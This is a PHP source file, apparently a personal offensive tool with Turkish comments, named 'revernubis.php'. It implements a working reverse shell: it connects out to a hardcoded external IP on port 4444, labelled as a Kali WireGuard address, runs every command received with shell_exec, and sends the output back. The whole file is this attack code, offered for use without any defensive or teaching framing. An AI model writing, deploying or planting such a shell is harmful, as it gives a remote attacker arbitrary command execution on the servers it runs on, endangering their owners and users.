<?php
// revernubis.php - Reverse Shell Client
// WireGuard IP ile güvenli bağlantı

// WireGuard IP'yi buraya yaz
$WG_IP = "89.39.107.172";  // Kali WireGuard IP
$PORT = 4444;

echo "==========================================\n";
echo "    REVERNUBIS REVERSE SHELL\n";
echo "==========================================\n";
echo "[+] WireGuard IP: $WG_IP\n";
echo "[+] Port: $PORT\n";
echo "[+] Bağlantı kuruluyor...\n\n";

// Socket oluştur
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if (!$socket) {
    die("[-] Socket oluşturulamadı\n");
}

// Server'a bağlan
if (!socket_connect($socket, $WG_IP, $PORT)) {
    die("[-] Bağlantı kurulamadı: $WG_IP:$PORT\n");
}

echo "[+] Server'a bağlandı\n";

// Ana döngü
while (true) {
    // Server'dan komut al
    $command = socket_read($socket, 1024);
    
    if (!$command) {
        echo "[-] Bağlantı kesildi\n";
        break;
    }
    
    $command = trim($command);
    
    if (strtolower($command) == 'exit') {
        echo "[+] Çıkış komutu alındı\n";
        break;
    }
    
    // Komutu çalıştır
    $output = shell_exec($command);
    
    if ($output === null) {
        $output = "[-] Komut çalıştırılamadı\n";
    }
    
    // Yanıtı gönder
    socket_write($socket, $output);
}

socket_close($socket);
echo "[+] Bağlantı kapatıldı\n";
?>
